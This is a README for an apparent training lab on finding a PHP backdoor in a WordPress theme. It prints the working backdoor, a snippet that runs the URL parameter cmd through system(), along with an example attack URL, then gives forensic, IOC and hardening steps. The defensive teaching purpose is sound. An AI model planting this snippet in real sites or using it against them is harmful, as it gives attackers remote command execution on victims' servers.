# WordPress Backdoor Analysis Lab

## Overview

This repository documents a simulated WordPress malware investigation focused on identifying and analyzing a PHP backdoor hidden inside a WordPress theme.

This is a hands-on training lab created to improve malware analysis and incident response skills.

---

# Lab Information

**Type:** Malware Analysis Lab

**Difficulty:** Intermediate

**Platform:** WordPress

**Language:** PHP

---

# Scenario

During a malware investigation, a suspicious PHP code was discovered inside:

```

wp-content/themes/twentytwentyfour/functions.php

```

The code looked like this:

```php
add_action('init', function () {

    if(isset($_GET['cmd'])){

        system($_GET['cmd']);

    }

});
```

---

# Initial Assessment

The code appears to be a PHP backdoor because it executes operating system commands directly from a user-controlled URL parameter.

This behavior is not part of normal WordPress functionality.

---

# Technical Analysis

## File Location

```

wp-content/themes/twentytwentyfour/functions.php

```

---

## Suspicious Function

```php
system()
```

Purpose:

Executes operating system commands on the server.

---

## Hook

```php
add_action('init')
```

Purpose:

Runs whenever WordPress initializes.

---

## User Input

```php
$_GET['cmd']
```

Purpose:

Accepts command input directly from the URL.

---

# Possible Attack

Example:

```

https://example.com/?cmd=id

```

Potential attacker capabilities:

- Execute system commands
- Read sensitive files
- Delete files
- Upload additional malware
- Download website data
- Create persistence
- Deface the website

---

# Investigation Workflow

1. Preserve the original file.
2. Create a forensic copy.
3. Review suspicious PHP functions.
4. Compare with a clean theme.
5. Search for additional backdoors.
6. Review web server logs.
7. Identify Indicators of Compromise (IOCs).
8. Remove malicious code.
9. Verify successful cleanup.
10. Perform security hardening.

---

# Indicators of Compromise

- Unexpected use of system()
- Suspicious use of init hook
- User-controlled command execution
- Modified functions.php

---

# Security Hardening

- Update WordPress Core
- Update Plugins
- Update Themes
- Remove unused plugins
- Reset passwords
- Review file permissions
- Install a security plugin
- Disable file editing

---

# Skills Demonstrated

- WordPress Malware Analysis
- PHP Code Review
- Incident Response
- IOC Identification
- Manual Malware Detection
- Security Hardening

---

# Lessons Learned

- Never trust user input.
- Preserve evidence before cleanup.
- Manual verification is essential.
- Always investigate the root cause.
- Search for additional persistence mechanisms.

---

# Status

Completed

Lab Simulation
